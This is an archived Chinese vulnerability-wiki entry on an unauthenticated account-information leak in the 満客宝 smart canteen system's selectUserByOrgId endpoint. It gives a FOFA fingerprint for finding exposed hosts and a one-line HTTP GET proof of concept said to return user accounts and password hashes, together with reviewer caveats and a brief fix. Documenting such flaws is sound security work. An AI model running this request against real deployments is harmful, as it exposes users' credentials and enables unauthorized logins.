---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "满客宝智慧食堂 selectUserByOrgId账户信息暴露"
product: "满客宝智慧食堂"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本"
prerequisites: "声称未认证"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%99%BA%E6%85%A7%E5%9F%8E%E5%B8%82/%E6%BB%A1%E5%AE%A2%E5%AE%9D%E6%99%BA%E6%85%A7%E9%A3%9F%E5%A0%82%E7%B3%BB%E7%BB%9F%20selectUserByOrgId%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md"
fofa: "icon_hash=\"-409875651\""
fofa_unverified: "icon_hash="
id: "vw-da0d719bb55742dd391bc766"
entity_id: "ve-da0d719bb55742dd391bc766"
schema_version: "1"
---

# 满客宝智慧食堂 selectUserByOrgId账户信息暴露

## 条目说明

- 对象与具体问题：满客宝智慧食堂；selectUserByOrgId账户信息暴露
- 版本、配置及部署条件：无版本
- 认证与权限前提：声称未认证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- FOFA icon_hash截断，record空值条件及返回字段只图
- 破解即可登录非必然，需区分密码hash/账户状态；在野无依据

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

由于满客宝智慧食堂系统 selectUserByOrgId 接口处未进行权限控制，导致未经身份验证的远程攻击者可以未授权访问，泄露系统用户账号密码等信息，进一步破解即可登录系统后台，导致系统处于极不安全的状态。

影响版本

满客宝智慧食堂系统

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 中 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：icon_hash="-409875651"

POC/EXP：

```http
GET /yuding/selectUserByOrgId.action?record= HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: close
```


![image-20240801170752521](./.resource/满客宝智慧食堂系统selectUserByOrgId未授权访问漏洞/media/image-20240801170752521.png)


## 修复方案

1. 关闭互联网暴露面或接口设置访问权限

   升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
